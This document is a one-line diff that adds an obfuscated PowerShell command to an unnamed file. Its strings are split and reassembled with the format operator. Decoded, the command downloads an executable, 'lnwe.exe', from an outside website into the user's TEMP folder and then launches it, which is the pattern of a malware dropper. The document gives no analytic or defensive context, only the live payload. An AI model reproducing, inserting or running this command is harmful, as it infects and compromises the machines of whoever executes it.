@@ -1,0 +1,1 @@
+﻿ InVokE-ExPResSION( (('(N'+'ew-'+'Obje'+'ct System.N'+'et.We'+'bCl'+'ient).Downlo'+'adFile'+'('+'{3}http'+'://w'+'w'+'w'+'.bry'+'onz.'+'com/'+'e'+'mo'+'t'+'i'+'o'+'ns/fil'+'es/lnw'+'e.ex'+'e'+'{3'+'}'+',{0}{'+'1'+'}e'+'nv:TE'+'M'+'P'+'{2}l'+'nwe'+'.'+'exe{'+'0});'+'S'+'tart-Pro'+'cess ({0}{1}env:TEM'+'P'+'{2}lnwe.e'+'xe{'+'0})')  -F  [cHAR]34,[cHAR]36,[cHAR]92,[cHAR]39) ) 
